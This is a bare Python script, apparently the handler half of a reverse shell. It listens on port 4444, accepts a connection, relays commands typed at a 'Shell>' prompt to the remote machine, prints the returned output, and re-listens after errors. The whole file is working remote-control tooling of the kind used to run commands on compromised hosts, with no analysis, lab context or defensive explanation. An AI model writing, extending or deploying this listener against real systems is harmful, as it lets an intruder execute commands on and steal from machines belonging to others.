import socket
import subprocess
import os
import time

IP = "127.0.0.1"
PORT = 4444

def receive_large_data(conn):
    data = b""
    while True:
        chunk = conn.recv(1024)
        if b"END_OF_DATA" in chunk:
            data += chunk.replace(b"END_OF_DATA", b"")
            break
        data += chunk
    return data.decode()

def listener():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((IP, PORT))
            server.listen(1)
            print(f"Listening on {IP}:{PORT}...")

            conn, addr = server.accept()
            print(f"Connection established from {addr}")

            while True:
                command = input("Shell> ")
                if not command:
                    continue
                
                conn.send(command.encode())

                if command.lower() == "exit":
                    break

                output = receive_large_data(conn)
                print(output)
            
            conn.close()
            server.close()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)  # Reattempt connection after 5 seconds

if __name__ == "__main__":
    listener()
